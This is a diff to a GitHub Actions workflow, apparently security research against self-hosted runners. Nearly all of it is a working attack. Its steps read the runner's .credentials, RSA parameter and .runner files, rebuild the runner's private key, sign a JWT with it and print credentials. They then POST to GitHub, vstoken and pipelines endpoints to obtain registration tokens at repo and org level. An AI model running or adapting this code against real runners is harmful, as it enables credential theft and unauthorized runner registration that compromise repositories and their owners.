@@ -4,158 +4,144 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Install And Generate JWT
-        run: |
-          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
-          
-          # Install cryptography module
-          pip3 install cryptography --break-system-packages 2>/dev/null || \
-          pip install cryptography 2>/dev/null
-          
-          python3 -c "
-          import json, time, base64
-          from cryptography.hazmat.primitives import serialization, hashes
-          from cryptography.hazmat.primitives.asymmetric import rsa, padding
-          from cryptography.hazmat.backends import default_backend
-          from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
-          
-          # Read credentials
-          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
-              creds = json.load(f)
-          
-          # Read RSA params    
-          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
-              params = json.load(f)
-          
-          print('Credential Keys:', list(creds['data'].keys()))
-          print('RSA Param Keys:', list(params.keys()))
-          print('Scheme:', creds['scheme'])
-          "
-
-      - name: Read Runner Config
-        run: |
-          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
-          
-          echo "=== RUNNER CONFIG ==="
-          cat $RUNNER_BASE/.runner | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(json.dumps(data, indent=2))
-          "
-
-      - name: Try Internal Endpoints With OAuth Token
-        run: |
-          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
-          
-          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data['data'].get('Token', ''))
-          ")
-          
-          CLIENT=$(cat $RUNNER_BASE/.credentials | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data['data'].get('clientId', ''))
-          ")
-          
-          echo "=== VSTOKEN ENDPOINT ==="
-          curl -s -X POST \
-          -H "Authorization: Bearer $TOKEN" \
-          -H "Accept: application/json" \
-          "https://vstoken.actions.githubusercontent.com/repos/${{ github.repository }}/actions/runners/registration-token"
-          
-          echo "=== PIPELINES ENDPOINT ==="
-          curl -s -X POST \
-          -H "Authorization: Bearer $TOKEN" \
-          -H "Accept: application/json" \
-          "https://pipelines.actions.githubusercontent.com/repos/${{ github.repository }}/actions/runners/registration-token"
-          
-          echo "=== TOKEN URL FROM RUNNER ==="
-          RUNNER_URL=$(cat $RUNNER_BASE/.runner | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data.get('serverUrl', ''))
-          ")
-          
-          echo "Runner Server URL: $RUNNER_URL"
-          
-          curl -s -X POST \
-          -H "Authorization: Bearer $TOKEN" \
-          -H "Accept: application/json" \
-          "$RUNNER_URL/repos/${{ github.repository }}/actions/runners/registration-token"
-
-      - name: Generate JWT And Try
+      - name: Generate JWT And Try All Endpoints
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
           pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
           
           python3 -c "
-          import json, time, base64, jwt
+          import json, time, base64, jwt, urllib.request, urllib.error
           from cryptography.hazmat.primitives import serialization
           from cryptography.hazmat.backends import default_backend
           from cryptography.hazmat.primitives.asymmetric.rsa import (
               RSAPrivateNumbers, RSAPublicNumbers, rsa_crt_iqmp, rsa_crt_dmp1, rsa_crt_dmq1
           )
-          import urllib.request, urllib.error
           
-          # Read params
           with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
               params = json.load(f)
           
           with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
               creds = json.load(f)
-          
+              
           with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
               runner = json.load(f)
-          
-          print('All RSA Keys:', list(params.keys()))
-          print('All Cred Keys:', list(creds['data'].keys()))
-          print('Runner Config:', json.dumps(runner, indent=2))
           
           def b64_to_int(b64):
               b64 += '=' * (4 - len(b64) % 4)
               return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
           
-          try:
-              # Build RSA private key from params
-              p = b64_to_int(params['p'])
-              q = b64_to_int(params['q'])
-              d = b64_to_int(params['d'])
-              n = b64_to_int(params['n'])
-              e = b64_to_int(params['e'])
-              
-              private_numbers = RSAPrivateNumbers(
-                  p=p, q=q, d=d,
-                  dmp1=rsa_crt_dmp1(d, p),
-                  dmq1=rsa_crt_dmq1(d, q),
-                  iqmp=rsa_crt_iqmp(p, q),
-                  public_numbers=RSAPublicNumbers(e=e, n=n)
-              )
-              
-              private_key = private_numbers.private_key(default_backend())
-              
-              print('RSA Key Successfully Built!')
-              
-              # Get client ID
-              client_id = creds['data'].get('clientId', '')
-              print('Client ID:', client_id)
-              
-              # Create JWT
-              now = int(time.time())
-              payload = {
-                  'sub': client_id,
-                  'iat': now,
-                  'exp': now + 3600,
-                  'iss': client_id
-              }
-              
-              token = jwt.encode(payload, private_key, algorithm='RS256')
-              print('JWT Token:', token)
-              
-          except Exception as ex:
-              print('Error:', str(ex))
-              import traceback
-              traceback.print_exc()
+          # Fixed key names
+          p = b64_to_int(params['p'])
+          q = b64_to_int(params['q'])
+          d = b64_to_int(params['d'])
+          n = b64_to_int(params['modulus'])    # Fixed
+          e = b64_to_int(params['exponent'])   # Fixed
+          dp = b64_to_int(params['dp'])
+          dq = b64_to_int(params['dq'])
+          iq = b64_to_int(params['inverseQ'])
+          
+          private_numbers = RSAPrivateNumbers(
+              p=p, q=q, d=d,
+              dmp1=dp,
+              dmq1=dq,
+              iqmp=iq,
+              public_numbers=RSAPublicNumbers(e=e, n=n)
+          )
+          
+          private_key = private_numbers.private_key(default_backend())
+          print('RSA Key Built Successfully!')
+          
+          client_id = creds['data']['clientId']
+          auth_url = creds['data']['authorizationUrl']
+          server_url = runner['serverUrl']
+          server_url_v2 = runner['serverUrlV2']
+          agent_id = runner['agentId']
+          
+          print('Client ID:', client_id)
+          print('Auth URL:', auth_url)
+          print('Server URL:', server_url)
+          print('Server URL V2:', server_url_v2)
+          
+          # Create JWT
+          now = int(time.time())
+          payload = {
+              'sub': client_id,
+              'iat': now,
+              'exp': now + 3600,
+              'iss': client_id,
+              'aud': 'https://github.com'
+          }
+          
+          token = jwt.encode(payload, private_key, algorithm='RS256')
+          print('JWT Generated:', token[:50], '...')
+          
+          headers = {
+              'Authorization': f'Bearer {token}',
+              'Accept': 'application/json',
+              'Content-Type': 'application/json',
+              'Content-Length': '0'
+          }
+          
+          # Try all endpoints
+          endpoints = [
+              # Auth URL from credentials
+              auth_url,
+              # Pipeline server with token in URL
+              server_url + 'actions/runners/registration-token',
+              # V2 broker endpoint
+              server_url_v2 + 'repos/${{ github.repository }}/actions/runners/registration-token',
+              # Standard API
+              'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
+              # Org level
+              'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token'
+          ]
+          
+          for endpoint in endpoints:
+              print(f'\n=== TRYING: {endpoint} ===')
+              try:
+                  req = urllib.request.Request(
+                      endpoint,
+                      method='POST',
+                      headers=headers,
+                      data=b''
+                  )
+                  with urllib.request.urlopen(req) as resp:
+                      print('SUCCESS:', resp.read().decode())
+              except urllib.error.HTTPError as e:
+                  print(f'HTTP {e.code}:', e.read().decode())
+              except Exception as ex:
+                  print('Error:', str(ex))
           "
+
+      - name: Try URL Token Directly
+        run: |
+          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
+          
+          # Extract token from serverUrl
+          SERVER_URL=$(cat $RUNNER_BASE/.runner | python3 -c "
+          import sys, json
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
+          print(data.get('serverUrl', ''))
+          ")
+          
+          echo "Server URL: $SERVER_URL"
+          
+          # Use URL token directly
+          echo "=== TRY SERVER URL TOKEN ==="
+          curl -s -X POST \
+          -H "Content-Length: 0" \
+          -H "Accept: application/json" \
+          "$SERVER_URL/repos/${{ github.repository }}/actions/runners/registration-token"
+          
+          echo "=== TRY REGISTRATION ENDPOINT ==="
+          curl -s -X POST \
+          -H "Content-Length: 0" \
+          -H "Accept: application/json" \
+          "$SERVER_URL/_apis/distributedtask/pools/1/agentregistrationrequests"
+          
+          echo "=== TRY VSTOKEN WITH CONTENT LENGTH ==="
+          curl -s -X POST \
+          -H "Content-Length: 0" \
+          -H "Accept: application/json" \
+          "https://vstoken.actions.githubusercontent.com/repos/${{ github.repository }}/actions/runners/registration-token"
